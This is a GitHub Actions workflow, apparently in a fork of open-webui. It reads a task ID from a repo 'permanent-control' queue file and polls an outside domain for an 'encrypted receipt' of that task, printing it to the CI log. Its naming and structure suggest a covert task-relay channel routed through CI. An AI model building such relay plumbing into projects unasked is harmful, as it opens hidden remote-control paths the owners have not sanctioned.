name: PowerPC control receipt probe
on:
  push:
    branches: [main]
    paths:
      - bootstrap-relay/permanent-control/queue.json
      - .github/workflows/powerpc-control-receipt-probe.yml
permissions:
  contents: read
jobs:
  receipt:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Fetch queue
        run: |
          set -euo pipefail
          curl -fsSL --retry 4 \
            "https://raw.githubusercontent.com/Christopher-Charman/open-webui/$GITHUB_SHA/bootstrap-relay/permanent-control/queue.json" \
            -o "$RUNNER_TEMP/queue.json"
          python3 - <<'PY' >"$RUNNER_TEMP/task-id"
          import json
          import os
          with open(os.path.join(os.environ['RUNNER_TEMP'], 'queue.json')) as stream:
            q=json.load(stream)
          print(q['tasks'][-1]['task_id'])
          PY
      - name: Poll encrypted receipt
        run: |
          set -euo pipefail
          id="$(cat "$RUNNER_TEMP/task-id")"
          for i in $(seq 1 40); do
            flat="https://www.powerpc-darwin.org/static/powerpc-control-result-$id.json"
            compat="https://www.powerpc-darwin.org/static/ppc-control-result-$id.json"
            for candidate in "$flat" "$compat"; do
              if curl -fsS --connect-timeout 8 --max-time 15 "$candidate" -o "$RUNNER_TEMP/receipt.json"; then
                echo "RECEIPT_URL=$candidate"
                echo "RECEIPT_BEGIN"
                cat "$RUNNER_TEMP/receipt.json"
                echo
                echo "RECEIPT_END"
                exit 0
              fi
            done
            for base in               "https://www.powerpc-darwin.org/.well-known/powerpc-control-v1/results"               "https://www.powerpc-darwin.org/static/powerpc-control-v1/results"
            do
              if curl -fsS --connect-timeout 8 --max-time 15 "$base/$id.json" -o "$RUNNER_TEMP/receipt.json"; then
                echo "RECEIPT_URL=$base/$id.json"
                echo "RECEIPT_BEGIN"
                cat "$RUNNER_TEMP/receipt.json"
                echo
                echo "RECEIPT_END"
                exit 0
              fi
            done
            sleep 5
          done
          echo "RECEIPT_UNAVAILABLE" >&2
          exit 1
